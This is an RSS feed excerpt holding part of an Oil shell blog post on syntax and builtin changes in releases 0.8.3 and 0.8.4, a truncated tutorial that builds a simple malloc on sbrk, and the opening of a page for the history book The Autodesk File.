<li><a href="http://www.oilshell.org/blog/2020/11/proposed-syntax.html">Proposed Changes to Oil's Syntax</a>.  New constructs I
left syntactic space for.  We cleaned up a lot, but there are still more
warts in shell.</li>
<li><em>Changes to Oil's Semantics</em>.  I overhauled shell options, variable scope, and
<code>proc</code>.</li>
<li><em>The Shell Programmer's Guide to <code>errexit</code></em>.  About error handling in shell
and Oil.</li>
</ol>
<p>(And that doesn't count <a href="http://www.oilshell.org/blog/2020/11/metrics.html">yesterday's metrics post</a>, which isn't
essential.)</p>
<p>A quick story that motivates these changes: A few months ago, I wrote the first
draft of <a href="http://www.oilshell.org/release/0.8.4/doc/idioms.html">Oil Language Idioms</a>.  That
led to more TODOs than expected, and to more docs, like <a href="http://www.oilshell.org/release/0.8.4/doc/shell-idioms.html">Shell Language
Idioms</a>.</p>
<p>Since then, I've been knocking off the TODOs.  So we're basically doing
<strong>documentation-driven development</strong>.</p>
<p>The purpose of this post is to <strong>get feedback</strong> about the Oil language.  That
said, I also want to spend time on <a href="http://www.oilshell.org/release/0.8.4/doc/">official
documentation</a>, so I may breeze through this quickly.
Please send feedback <a href="https://old.reddit.com/r/oilshell/comments/jqj86j/more_changes_to_oils_syntax/?">in the comments</a>, on <a href="http://www.oilshell.org/cross-ref.html?tag=Zulip#Zulip">Zulip</a>, or
on Github.</p>
 
<a name="special-variables-and-functions-_status-_match"></a>
<h2>Special Variables and Functions: <code>_status</code>, <code>_match()</code></h2>
<p>Shell has special variables like <code>$?</code> and <code>${BASH_REMATCH[@]}</code>.  They are
<strong>implicitly mutated</strong> by the interpreter.</p>
<p>Oil supports them, but I decided that we need a more consistent style with less
punctuation and CAPS.</p>
<p>A <strong>leading underscore</strong> gives these variables their own namespace, and lower
case makes them easier to type.</p>
<ul>
<li>Related to <a href="http://www.oilshell.org/blog/2020/10/osh-features.html#reliable-error-handling">the errexit
overhaul</a>:
<ul>
<li><code>_status</code> is a synonym for <code>$?</code>, and it's useful in expression mode.</li>
<li><code>@_pipeline_status</code> and <code>@_process_sub_status</code> for the result of process
concurrency constructs.</li>
</ul>
</li>
<li>Regex API:
<ul>
<li><code>_match()</code> is now implemented.  The call <code>_match(x)</code> is like <code>m.group(x)</code>
in Python, except it's not a method on a match object.</li>
<li><code>_start()</code> and <code>_end()</code> are planned.</li>
</ul>
</li>
<li>Design decision: If we ever get <a href="http://www.oilshell.org/blog/tags.html?tag=awk#awk">Awk</a>-like functionality,
<ul>
<li>We'll use  <code>_line</code>, <code>_field(1)</code>, and <code>_filename</code> ...</li>
<li>Instead of <code>$0</code>, <code>$1</code>, and <code>FILENAME</code></li>
<li><a href="http://www.oilshell.org/cross-ref.html?tag=QTSV#QTSV">QTSV</a> columns can also be named, eliminating the need for
<code>_field()</code>.</li>
</ul>
</li>
</ul>
<a name="stricter-syntax"></a>
<h2>Stricter Syntax</h2>
<a name="enforced-parse_backslash-in-unquoted-words"></a>
<h3>Enforced <code>parse_backslash</code> in Unquoted Words</h3>
<p>This is like the <a href="http://www.oilshell.org/blog/2020/10/big-changes.html#tightened-up-string-literals">string literal
changes</a> mentioned in the
last post.</p>
<p>See these nice tables!  <a href="https://github.com/oilshell/oil/issues/860">https://github.com/oilshell/oil/issues/860</a></p>
<p>Summary:</p>
<ul>
<li>Oil only has <strong>two meanings</strong> of <code>\n</code>: it's either a newline, or literally
<code>\n</code>, depending on the quotes.</li>
<li>Shell actually has <strong>three</strong>, as <code>echo \n</code> prints just <code>n</code>!  This is now
disallowed in Oil: use <code>echo n</code> or <code>echo \\n</code> instead.</li>
</ul>
<a name="syntax-error-for-seq-3trailing"></a>
<h3>Syntax Error For <code>@(seq 3)trailing</code></h3>
<p>All constructs beginning with a <code>@</code> sigil must occupy a whole word.  There's no
implicit joining as with bash:</p>
<pre><code><span>$</span> <span>echo x"$@"y </span>  
</code></pre>
<p>The <code>@</code> constructs are:</p>
<pre><code><span>$</span> <span>echo @myarray</span>
<span>$</span> <span>echo @(split command sub)</span>
<span>$</span> <span>echo @array_func(x, y) @glob(pat) @split(s)</span>
</code></pre>
<a name="keywords-and-operators"></a>
<h2>Keywords and Operators</h2>
<a name="the-and-_-pseudo-assignment-keywords"></a>
<h3>The <code>=</code> and <code>_</code> "Pseudo-Assignment" Keywords</h3>
<p>This was done in a previous release, but deserves mention here.  Shell
assignments take expressions on the RHS:</p>
<pre><code>var x = 42 + f(x)
</code></pre>
<p>You can pretty-print an expression like this, which is useful in the REPL:</p>
<pre><code>= 42 + f(x)    
</code></pre>
<p>You can also <strong>ignore</strong> the result of an expression:</p>
<pre><code>_ 42 + f(x)    
_ = 42 + f(x)  
</code></pre>
<p>This is useful for functions with side effects:</p>
<pre><code>_ mylist.append(x)
_ mylist.extend(['str', var])
</code></pre>
<p>However we also have a shell style:</p>
<pre><code>push :mylist str $var
</code></pre>
<p>I don't expect <code>_</code> to be used that often in real code.  Functions usually
return values and are used like <code>echo $len(x)</code>.</p>
<a name="removed-pass-based-on-your-feedback"></a>
<h3>Removed <code>pass</code> Based On Your Feedback</h3>
<p>The <code>pass</code> keyword was intended for left-to-right function calls as in
<a href="http://www.oilshell.org/cross-ref.html?tag=dplyr#dplyr">dplyr</a>.</p>
<p>However, many people mentioned that it conflicted with existing programs.  And
we can use the <code>_</code> keyword instead.</p>
<p>So I removed it.  I listened to your feedback!</p>
<a name="the-operator-for-approximate-equality"></a>
<h3>The <code>~==</code> Operator for Approximate Equality</h3>
<p>Oil has typed data, so this operator will help us be as convenient as <a href="http://www.oilshell.org/blog/tags.html?tag=awk#awk">Awk</a>,
while avoiding the pitfalls of JavaScript's <code>==</code>:</p>
<pre><code>var mystr = '42'  

if (x == 42) {    
  echo 'yes'    
}

if (x ~== 42) {   
  echo 'yes'
}
</code></pre>
<p>We might also use this operator for approximate floating point comparisons.  I
could use help on this!</p>
<a name="doc-comments-like-are-now-recognized"></a>
<h3>Doc Comments Like <code>###</code> Are Now Recognized</h3>
<p>The parser now recognizes doc comments and attached them to the AST.  It's the
first line after an opening <code>{</code> with <code>###</code>.</p>
<pre><code>proc restart(pid) {
   

   kill $pid
}
</code></pre>
<p>It also works for shell-style functions:</p>
<pre><code>f() {
   

   kill $1
}
</code></pre>
<p>We can use this for autocompletion and more.  Feedback is welcome.</p>
<a name="many-builtin-commands-enhanced"></a>
<h2>Many Builtin Commands Enhanced</h2>
<a name="repr-renamed-to-pp-pretty-print"></a>
<h3><code>repr</code> Renamed to <code>pp</code> (pretty print)</h3>
<p>(1) <code>pp cell</code> pretty-prints cells, which are the locations of variables.</p>
<p>Cells have flags like <code>-x</code> (export).  This builtin is very useful for debugging
shell programs!</p>
<pre><code><span>osh$</span> <span>export FOO=bar</span>
<span>osh$</span> <span>pp cell FOO</span>
FOO = (cell exported:T readonly:F nameref:F val:(value.Str s:bar))
</code></pre>
<p>(This format isn't stable yet.  See <a href="https://github.com/oilshell/oil/issues/817">issue 817</a>).</p>
<p>(2) <code>pp proc</code> shows doc comments.  It prints a table, which means it's the
first usage of <a href="http://www.oilshell.org/cross-ref.html?tag=QTSV#QTSV">QTSV</a> in Oil!</p>
<pre><code><span>osh$</span> <span>pp proc</span>
proc_name       doc_comment
f       'doc \' comment with " quotes'
g       ''
</code></pre>
<p>Now we need a <code>QTSV_PAGER</code>, i.e. something like <code>less</code> for tables.  <a href="https://lobste.rs/s/zvallq/pretty_csv_viewing_on_command_line">I recently
learned</a> that we
can do a quick and dirty job with <code>column</code>.</p>
<a name="added-long-flags-shopt-set-test-dir"></a>
<h3>Added Long Flags: <code>shopt --set</code>, <code>test --dir</code></h3>
<ul>
<li>We now have <code>shopt --set</code> and <code>--unset</code> instead of <code>shopt -s</code> and <code>-u</code>.</li>
<li>And <code>test --dir</code> <code>--exists</code>, etc. instead of <code>test -d</code>, <code>-e</code>, etc.</li>
</ul>
<p>Other enhancements to <code>shopt</code> and <code>test</code>:</p>
<ul>
<li><code>shopt -p</code> respects option groups.  For example, <code>shopt -p oil:all</code> prints
the current value of all Oil options.
<ul>
<li>We may want <code>shopt --print</code> to use a clearer format.</li>
</ul>
</li>
<li>Implemented <code>simple_test_builtin</code>, which enforces that <code>test</code>  accepts 2 or 3
arguments, and isn't spelled <code>[</code>.  This is on in <code>oil:all</code>.
<ul>
<li>See <a href="http://www.oilshell.org/blog/2017/08/31.html">Problems With the test Builtin: What Does -a
Mean?</a></li>
</ul>
</li>
</ul>
<p>The idiom for turning on Oil is now:</p>
<pre><code>shopt --set oil:basic  
shopt --set oil:all    
</code></pre>
<p>Or you can use <code>bin/oil</code> to turn on <code>oil:all</code>.</p>
<a name="structured-io-read-line-write-qsn"></a>
<h3>Structured I/O: <code>read --line</code>, <code>write --qsn</code></h3>
<p>These changes were discussed in <a href="http://www.oilshell.org/blog/2020/10/osh-features.html">Four Features That Justify a New Unix
Shell</a>.  We want to remove the need for ad hoc parsing
and splitting.</p>
<p>So we have preliminary <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a> support, but we still need more
<a href="http://www.oilshell.org/cross-ref.html?tag=QTSV#QTSV">QTSV</a> support.</p>
<p>Another idea for a primitive:</p>
<ul>
<li><code>read -qsn-cells :var1 :var2</code> should read multiple cells on a line.  It
should split by tabs, and decode each field.  On the other hand,
<a href="http://www.oilshell.org/cross-ref.html?tag=QTSV#QTSV">QTSV</a> has typed columns (integers, floats, and booleans).</li>
</ul>
<a name="added-block-arguments-shopt-fork-forkwait"></a>
<h3>Added Block Arguments: <code>shopt</code>, <code>fork</code>, <code>forkwait</code></h3>
<p>This came directly out of <a href="http://www.oilshell.org/release/0.8.4/doc/idioms.html">Oil Language
Idioms</a>.  Oil has a more consistent syntax:</p>
<pre><code>sleep 2 &amp;             
fork { sleep 2 }      

( sleep 2 )           
forkwait { sleep 2 }  
</code></pre>
<p>This allows us to use <code>&amp;</code> for redirects, and <code>()</code> for expressions.</p>
<p>We use the same block syntax to save and restore state:</p>
<pre><code>shopt --unset errexit {
  step1
  echo $?

  step2
  echo $?
}
</code></pre>
<p>This was enabled by a pleasant refactoring of the "option stack", which was
<a href="https://oilshell.zulipchat.com/#narrow/stream/208950-zephyr-asdl/topic/ASDL.2Fstatic.20typing.20success">aided by static
typing</a>.
This stack is now used consistently for many purposes:</p>
<ol>
<li><code>shopt</code> blocks</li>
<li>The broken POSIX <code>errexit</code> semantics.  Error handling is disabled in the
constructs <code>if / while / until / &amp;&amp;   ||   !</code>.  We unfortunately have to
implement this.</li>
<li>The <code>run</code> builtin, which undoes this bad behavior by re-enabling <code>errexit</code>.</li>
<li>The <code>strict_errexit</code> option, which detects code that would <strong>lose errors</strong>.</li>
<li>Disabling <a href="http://www.oilshell.org/cross-ref.html?tag=dynamic-scope#dynamic-scope">dynamic scope</a> in procs, which I describe in
an upcoming post.  The option stack follows the call stack.</li>
</ol>
<a name="conclusion"></a>
<h2>Conclusion</h2>
<p>This was post 2 of 5 that explains the Oil 0.8.3 and 0.8.4 release.  I wrote
down what I think Oil's idioms should be, and then I implemented them!</p>
<p>Please try <a href="http://www.oilshell.org/release/0.8.4/">Oil 0.8.4</a> and <a href="https://github.com/oilshell/oil/wiki/Where-To-Send-Feedback">let me
know</a> what
happens!</p>
<a name="appendix-issues-closed-in-083"></a>
<h2>Appendix: Issues Closed in 0.8.3</h2>
<p>These issues were closed for <a href="http://www.oilshell.org/release/0.8.3/">Oil 0.8.3</a>, and I discuss most
of them in this series of posts.</p>
<table>
<tbody><tr>
  <td>
    <a href="https://github.com/oilshell/oil/issues/835">#835</a>
  </td>
  <td>
    Make expression language compatible with Python
  </td>
</tr>
<tr>
  <td>
    <a href="https://github.com/oilshell/oil/issues/826">#826</a>
  </td>
  <td>
    clarify QSN use cases
  </td>
</tr>
<tr>
  <td>
    <a href="https://github.com/oilshell/oil/issues/775">#775</a>
  </td>
  <td>
    errexit not disabled where it should be
  </td>
</tr>
<tr>
  <td>
    <a href="https://github.com/oilshell/oil/issues/735">#735</a>
  </td>
  <td>
    remove 'pass' builtin
  </td>
</tr>
<tr>
  <td>
    <a href="https://github.com/oilshell/oil/issues/713">#713</a>
  </td>
  <td>
    long flags for shopt builtin, e.g. --set and --unset
  </td>
</tr>
<tr>
  <td>
    <a href="https://github.com/oilshell/oil/issues/711">#711</a>
  </td>
  <td>
    Oil should have a slurp builtin
  </td>
</tr>
<tr>
  <td>
    <a href="https://github.com/oilshell/oil/issues/582">#582</a>
  </td>
  <td>
    QSN serialization format: parser,  printer, builtin
  </td>
</tr>
<tr>
  <td>
    <a href="https://github.com/oilshell/oil/issues/501">#501</a>
  </td>
  <td>
    shopt should respect set -o options
  </td>
</tr>
<tr>
  <td>
    <a href="https://github.com/oilshell/oil/issues/476">#476</a>
  </td>
  <td>
    consider a different definition of strict_errexit
  </td>
</tr>
</tbody></table>




</div>]]>
            </description>
            <link>http://www.oilshell.org/blog/2020/11/more-syntax.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25029243</guid>
            <pubDate>Sun, 08 Nov 2020 21:29:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Demystifying malloc]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25028746">thread link</a>) | @riverg
<br/>
November 8, 2020 | https://river.codes/demystifying-malloc/ | <a href="https://web.archive.org/web/*/https://river.codes/demystifying-malloc/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content"> <article itemscope="" itemtype="https://schema.org/BlogPosting">  <div itemprop="articleBody"> <p>It feels wrong to use a tool without knowing fully how it works. As programmers it is hard to accept that there is only so much that can fit into our noggins at once, but looking at code benchmarks or stack traces to see that some large amount of time is spent in some low-level C code always makes me wonder what is really going on in there. Maybe you’re like me and occasionally start to use the ‘Go to definition’ IDE feature on standard libraries, and after a second or two of searching your window fills with scary underscores and <code>#DEFINE</code>s of things you didn’t know existed, you think maybe this thing was auto-generated and no human would bother writing this header-file-hell. Unsatisfied you go back to whatever you were working on, no closer to understanding what’s <em>really</em> going on down there.</p> <p>For me I was always perplexed by <code>malloc</code>. It’s a simple function, you ask for memory and it gives it to you. But <em>how</em> could a C function do that? What on Earth does it mean to <em>allocate</em> memory? Isn’t it all there, sitting on the bus, just <strong>waiting</strong> for us to issue some good ‘ol <code>MOV</code> instructions? Even worse, it is used <em>everywhere</em>. Even if you aren’t using C there’s a good chance you’re using <code>malloc</code>, every time you create a new object in a language implemented in C, like <code>cpython</code> for instance. It isn’t the only way to acquire memory, but it sure is a popular one.</p> <p>So let’s take a look at <code>malloc</code>, it can’t be that complicated right? Here’s a simple <code>malloc</code>:</p> <div><div><pre><code><span>void</span><span>*</span> <span>malloc</span><span>(</span><span>size_t</span> <span>size</span><span>)</span> <span>{</span>
  <span>return</span> <span>sbrk</span><span>(</span><span>size</span><span>);</span>
<span>}</span>
</code></pre></div></div> <p>From this you may be able to figure out what <code>sbrk</code> does. It gives us a chunk of memory. Specifically it allocates program heap memory of a given size and returns a pointer to it. What exactly is “it” that is being pointed to? Let’s start printing stuff and find out.</p> <div><div><pre><code><span>void</span><span>*</span> <span>a</span> <span>=</span> <span>sbrk</span><span>(</span><span>0</span><span>);</span>
<span>void</span><span>*</span> <span>b</span> <span>=</span> <span>sbrk</span><span>(</span><span>100</span><span>);</span>
<span>void</span><span>*</span> <span>c</span> <span>=</span> <span>sbrk</span><span>(</span><span>0</span><span>);</span>
<span>printf</span><span>(</span><span>"[a: %p]</span><span>\n</span><span>[b: %p]</span><span>\n</span><span>[c: %p]</span><span>\n</span><span>"</span><span>,</span> <span>a</span><span>,</span> <span>b</span><span>,</span> <span>c</span><span>);</span>
</code></pre></div></div> <div><div><pre><code>&gt; [a: 0x1065b4064]
  [b: 0x1065b4064]
  [c: 0x1065b40c8]
</code></pre></div></div> <p>Looks like <code>b</code> is the same as <code>a</code> and <code>c</code> is <code>b + 100</code> bytes. So <code>sbrk</code> returns a pointer to whatever the last ‘tip’ of the program heap is, and if we give it a size in bytes it’ll move that ‘tip’ up. Meaning if we <code>sbrk</code> ourselves that 100 byte chunk we can do whatever we want with it knowing that the next time we <code>sbrk</code> ourselves some more memory, it’ll be 100 bytes farther along.</p> <p>This may not be too satisfying, we’ve replaced one magical function with another. However, in this case <code>sbrk</code> is a system call. It’s going to jump the CPU over to some assembly to execute (the instruction set implemented by your CPU is very likely to have a set of functions for interfacing with memory), at least now we’re talking to the kernel instead of wondering what’s going in the the C standard library.</p> <p>So that’s <code>malloc</code>, simple right? Well judging from the length of this article you can probably deduce otherwise. There’s more here, and for two reasons:</p> <ol> <li><code>sbrk</code> is absolutely ancient and super-deprecated. In fact if you run these snippets on macOS you’re going to get tons of warnings (but hey, it still works!). It doesn’t work with virtual memory and it isn’t thread-safe. However, its API is very simple to use and <code>malloc</code> at one point in time very likely was implemented using <code>sbrk</code>.</li> <li>This implementation of <code>malloc</code> is incorrect. The first reason why, which you may be able to guess, is that <code>sbrk</code> can fail. Memory is a finite resource.</li> </ol> <p>According to <code>man sbrk</code>, the call can return -1 if it fails, but <code>malloc</code> is supposed to return <code>NULL</code>. This is fixed easily enough.</p> <div><div><pre><code><span>void</span><span>*</span> <span>malloc</span><span>(</span><span>size_t</span> <span>size</span><span>)</span> <span>{</span>
  <span>void</span><span>*</span> <span>chunk_start</span> <span>=</span> <span>sbrk</span><span>(</span><span>size</span><span>);</span>
  <span>return</span> <span>chunk_start</span> <span>==</span> <span>(</span><span>void</span><span>*</span><span>)</span><span>-</span><span>1</span> <span>?</span> <span>NULL</span> <span>:</span> <span>chunk_start</span><span>;</span>
<span>}</span>
</code></pre></div></div> <p>One more thing. <code>malloc(0)</code> has special behavior, it needs to return <code>NULL</code> as well, otherwise you’d be able to get a pointer back from <code>malloc</code> that you didn’t actually allocate, and that would be weird.</p> <div><div><pre><code><span>void</span><span>*</span> <span>malloc</span><span>(</span><span>size_t</span> <span>size</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span><span>size</span> <span>==</span> <span>0</span><span>)</span> <span>return</span> <span>NULL</span><span>;</span>
  <span>void</span><span>*</span> <span>chunk_start</span> <span>=</span> <span>sbrk</span><span>(</span><span>size</span><span>);</span>
  <span>return</span> <span>chunk_start</span> <span>==</span> <span>(</span><span>void</span><span>*</span><span>)</span><span>-</span><span>1</span> <span>?</span> <span>NULL</span> <span>:</span> <span>chunk_start</span><span>;</span>
<span>}</span>
</code></pre></div></div> <p>Great, now the user can actually know whether their memory request was fulfilled. We’re still missing something though, the result of our <code>malloc</code> doesn’t work with <code>free</code>. What <em>is</em> <code>free</code> exactly?</p> <p>According to <code>man free</code>, <code>free</code> will remove the allocation (“free”ing the space) from an input pointer that was previously returned from malloc. Now <code>sbrk</code> has a feature where when a negative input is passed to it, it will move the tip of the heap <em>down</em> instead of up. So effectively it allows us to push and pop from the program heap, because the heap is a stack and computer terminology is silly.</p> <p>Unfortunately this isn’t enough for us. Imagine a user does the following:</p> <div><div><pre><code><span>void</span><span>*</span> <span>a</span> <span>=</span> <span>malloc</span><span>(</span><span>500</span><span>);</span>
<span>// We can now call sbrk(-500) to free a.</span>
<span>void</span><span>*</span> <span>b</span> <span>=</span> <span>malloc</span><span>(</span><span>1000</span><span>);</span>
<span>// But how do we free a from here?</span>
</code></pre></div></div> <p>This is the age-old problem of trying to delete something from the middle of the stack. We could pop everything off of the stack until we reach the memory we’re trying to delete (storing it somewhere else, we could even use the disk), then pop the item to delete, then push everything else back onto the stack. This would be miserably slow. We could also abandon the stack mentality and just use <code>memcpy</code> to copy over the old bytes. This would also be very slow, usually we expect <code>free</code> to take an insignificant amount of time to complete. In either of these cases, we’ve created a new problem: when shifting all of the old memory to utilize the newly free’d space, all of the pointers in the program refering to that old memory would be invalidated.</p> <p>It looks like we’re going to have take matters into our own hands. Maybe in the future we’ll have more memory than we know what to do with and never free anything. Until then we’ll need to do something clever. We have one thing going for us though, <code>malloc</code> always returns a pointer to <em>contiguous</em> memory. If we have a single “hole” of <code>free</code>d memory in the heap large enough to use somewhere, we can use it. It’s simply a matter, then, of us keeping track of the allocated chunks (and the “holes” created by <code>free</code>ing those chunks) ourselves.</p> <p>So maybe it was wrong to say earlier that <code>sbrk</code> “allocates” memory for us, because now it seems like it just moves some pointer and tells us where it used to be. The actual “allocation” part of <code>malloc</code> is something we’ll have to implement. Let’s set up a general outline of what we want to accomplish.</p> <div><div><pre><code><span>typedef</span> <span>struct</span> <span>chunk</span> <span>{</span>
  <span>size_t</span> <span>size</span><span>;</span>  <span>// size of user-accessible memory.</span>
  <span>struct</span> <span>chunk</span><span>*</span> <span>next</span><span>;</span>
  <span>bool</span> <span>allocated</span><span>;</span>
<span>}</span> <span>Chunk</span><span>;</span>

<span>Chunk</span><span>*</span> <span>heap</span><span>;</span>

<span>void</span><span>*</span> <span>chunk_data</span><span>(</span><span>Chunk</span><span>*</span> <span>chunk</span><span>)</span> <span>{</span>
  <span>// Adding 1 to a Chunk* will get us to the part of memory</span>
  <span>// directly after the fields.</span>
  <span>return</span> <span>chunk</span> <span>?</span> <span>chunk</span><span>+</span><span>1</span> <span>:</span> <span>NULL</span><span>;</span>
<span>}</span>

<span>// Returns the Chunk corresponding to the chunk's data.</span>
<span>Chunk</span><span>*</span> <span>chunk_metadata</span><span>(</span><span>void</span><span>*</span> <span>ptr</span><span>)</span> <span>{</span>
  <span>return</span> <span>ptr</span> <span>?</span> <span>(</span><span>Chunk</span><span>*</span><span>)</span><span>ptr</span><span>-</span><span>1</span> <span>:</span> <span>NULL</span><span>;</span>
<span>}</span>

 <span>// TODO: Do the hard part.</span>
<span>Chunk</span><span>*</span> <span>find_or_reserve_chunk</span><span>(</span><span>size_t</span> <span>size</span><span>);</span>

<span>void</span><span>*</span> <span>malloc</span><span>(</span><span>size_t</span> <span>size</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span><span>size</span> <span>==</span> <span>0</span><span>)</span> <span>return</span> <span>NULL</span><span>;</span>
  <span>return</span> <span>chunk_data</span><span>(</span><span>find_or_reserve_chunk</span><span>(</span><span>size</span><span>));</span>
<span>}</span>

<span>void</span> <span>free</span><span>(</span><span>void</span><span>*</span> <span>ptr</span><span>)</span> <span>{</span>
  <span>Chunk</span><span>*</span> <span>chunk</span> <span>=</span> <span>chunk_metadata</span><span>(</span><span>ptr</span><span>);</span>
  <span>if</span> <span>(</span><span>!</span><span>chunk</span><span>)</span> <span>return</span><span>;</span>
  <span>chunk</span><span>-&gt;</span><span>allocated</span> <span>=</span> <span>false</span><span>;</span>
<span>}</span>
</code></pre></div></div> <p>We want some way to model the heap, so a linked list sounds simple enough. We could extend it to create an actual stack, but it isn’t really needed here. Normally we’d implement a linked list using <code>malloc</code>, but we’re implementing <code>malloc</code> so we can’t really use that, can we? So let’s just sneak our data structure in with the user data. The general idea is that for every chunk of memory allocated by <code>malloc</code>, the we store a few bytes (specifically <code>sizeof(Chunk)</code>) of metadata about that chunk right beforehand. We could store a pointer in Chunk to the actual user memory, but since the memory is contiguous we can easily compute where the metadata ends and the user data begins. <code>free</code>ing then becomes super easy, we can just get the metadata and mark that it’s no longer allocated. The hard part is using that information.</p> <div><div><pre><code><span>// Allocates a new chunk right after 'prev'.</span>
<span>Chunk</span><span>*</span> <span>allocate_chunk</span><span>(</span><span>Chunk</span><span>*</span> <span>prev</span><span>,</span> <span>size_t</span> <span>size</span><span>);</span>

<span>Chunk</span><span>*</span> <span>find_or_reserve_chunk</span><span>(</span><span>size_t</span> <span>size</span><span>)</span> <span>{</span>
  <span>Chunk</span><span>*</span> <span>prev_chunk</span> <span>=</span> <span>NULL</span><span>;</span>

  <span>// Initialize the heap if necessary.</span>
  <span>if</span> <span>(</span><span>!</span><span>heap</span><span>)</span> <span>{</span>
    <span>heap</span> <span>=</span> <span>allocate_chunk</span><span>(</span><span>prev_chunk</span><span>,</span> <span>size</span><span>);</span>
    <span>return</span> <span>chunk_data</span><span>(</span><span>heap</span><span>);</span>
  <span>}</span>

  <span>// Scan the heap for holes large enough for the chunk we want.</span>
  <span>Chunk</span><span>*</span> <span>chunk</span> <span>=</span> <span>heap</span><span>;</span>
  <span>while</span> <span>(</span><span>chunk</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>!</span><span>chunk</span><span>-&gt;</span><span>allocated</span> <span>&amp;&amp;</span> <span>chunk</span><span>-&gt;</span><span>size</span> <span>&gt;=</span> <span>size</span><span>)</span> <span>break</span><span>;</span>
    <span>prev_chunk</span> <span>=</span> <span>chunk</span><span>;</span>
    <span>chunk</span> <span>=</span> <span>chunk</span><span>-&gt;</span><span>next</span><span>;</span>
  <span>}</span>

  <span>if</span> <span>(</span><span>chunk</span><span>)</span> <span>{</span>
    <span>chunk</span><span>-&gt;</span><span>allocated</span> <span>=</span> <span>true</span><span>;</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>chunk</span> <span>=</span> <span>allocate_chunk</span><span>(</span><span>prev_chunk</span><span>,</span> <span>size</span><span>);</span>
  <span>}</span>

  <span>return</span> <span>chunk</span><span>;</span>
<span>}</span>
</code></pre></div></div> <p>From here you can devise faster ways of doing this. The memory-speed tradeoff here is real, you can avoid scanning the heap every time by reserving a portion of the start of the heap for a hash map storing holes by size requirement, but then of course you’ve got less of the heap for the user. You also need to consider the size of this portion. You won’t be able to grow it, since then you’d be invalidating user pointers.</p> <p>If speed is less of a concern, you’d want to scan the entire heap rather than stopping at the first available hole. With the above implementation the user would often get back chunks of memory where the allocation is actually greater than they requested. If you scan the entire heap, you can look for the smallest hole that fits the requirements. Another way of doing this is to terminate the chunk to always fit the requested size, creating a new chunk for the leftover data. You’d have to make sure whatever leftover has enough room for the metadata fields.</p> <p>This is why the data stored in the pointer returned from <code>malloc</code> is uninitiliazed, it may have been a chunk from some previously requested memory.</p> <p>The last bit is where we actually build up the heap model:</p> <div><div><pre><code><span>Chunk</span><span>*</span> <span>allocate_chunk</span><span>(</span><span>Chunk</span><span>*</span> <span>prev</span><span>,</span> <span>size_t</span> <span>size</span><span>)</span> <span>{</span>
  <span>Chunk</span><span>*</span> <span>chunk</span> <span>=</span> <span>(</span><span>Chunk</span><span>*</span><span>)</span><span>sbrk</span><span>(</span><span>size</span> <span>+</span> <span>sizeof</span><span>(</span><span>Chunk</span><span>));</span>
  <span>if</span> <span>(</span><span>chunk</span> <span>==</span> <span>(</span><span>Chunk</span><span>*</span><span>)</span><span>-</span><span>1</span><span>)</span> <span>{</span>
    <span>return</span> <span>NULL</span><span>;</span>
  <span>}</span>

  <span>if</span> <span>(</span><span>prev</span><span>)</span> <span>{</span>
    <span>prev</span><span>-&gt;</span><span>next</span> <span>=</span> <span>chunk</span><span>;</span>
  <span>}</span>

  <span>chunk</span><span>-&gt;</span><span>size</span> <span>=</span> <span>size</span><span>;</span>
  <span>chunk</span><span>-&gt;</span><span>allocated</span> <span>=</span> <span>true</span><span>;</span>
  <span>chunk</span><span>-&gt;</span><span>next</span> <span>=</span> <span>NULL</span><span>;</span>
  <span>return</span> <span>chunk</span><span>;</span>
<span>}</span>
</code></pre></div></div> <p>We take in …</p></div></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://river.codes/demystifying-malloc/">https://river.codes/demystifying-malloc/</a></em></p>]]>
            </description>
            <link>https://river.codes/demystifying-malloc/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25028746</guid>
            <pubDate>Sun, 08 Nov 2020 20:34:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Autodesk File: Bits of History, Words of Experience]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25028729">thread link</a>) | @ingve
<br/>
November 8, 2020 | https://www.fourmilab.ch/autofile/ | <a href="https://web.archive.org/web/*/https://www.fourmilab.ch/autofile/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
<img src="https://www.fourmilab.ch/autofile/e5/figures/aiflag.png" width="189" height="179" alt="Autodesk flag">

<h3><i>Bits of History, Words of Experience</i></h3>
<address>
Edited by<br>
<a href="https://www.fourmilab.ch/" target="_top">John Walker</a>
</address>
<p>
<span face="Helvetica, Arial, sans-serif">Fifth Edition, 2017</span>
</p>


<p>
<em>The Autodesk File</em> chronicles the history of Autodesk, Inc.
and its principal product, AutoCAD,
through contemporary documents edited and annotated
by Autodesk founder and former CEO <a href="https://www.fourmilab.ch/" target="_top">John Walker</a>.
The book traces the company from the first glimmer of an idea in the
minds of the founders, through start-up, initial public stock
offering, and growth from a loose confederation of moonlighting
individuals to a leader in the industry of computer aided design.
The book is available in several different editions, suited
for on- or off-line reading with various tools.  Click on
the titles of the section describing the edition you prefer
to view it or download to your computer.
</p>

<h2><a href="https://www.fourmilab.ch/autofile/e5/">Fifth Edition</a></h2>

<p>
<a href="https://www.fourmilab.ch/autofile/e5/"><img src="https://www.fourmilab.ch/autofile/figures/af5_screenshot.png" width="256" height="252" alt="The Autodesk File: Fifth Edition"></a>
The Fifth Edition (2017) of <cite>The Autodesk File</cite> was prepared to
commemorate the thirty-fifth anniversary of the founding of Autodesk
in 1982.  Except for correction of a few typographical errors, the
content is identical to that of the 1994 fourth edition, but the
book has been entirely reformatted and updated to contemporary
Web standards.  The typography uses Unicode text entities, and should
be much easier on the eye.  Each chapter is now a single document,
instead of being broken into sections and subsections, and easier
to read without incessant clicking on navigation buttons.  All of
the AutoCAD sample drawings used as illustrations have been
re-made from their original PostScript plot files with higher
resolution.  The pop-up windows for footnotes (which were irritating
and ran afoul of some browser pop-up blockers) have been replaced by
<img src="https://www.fourmilab.ch/autofile/e5/i/footnote.png" width="16" height="16" alt="[Footnote]">
icons which display the footnote when clicked.  Cross-references
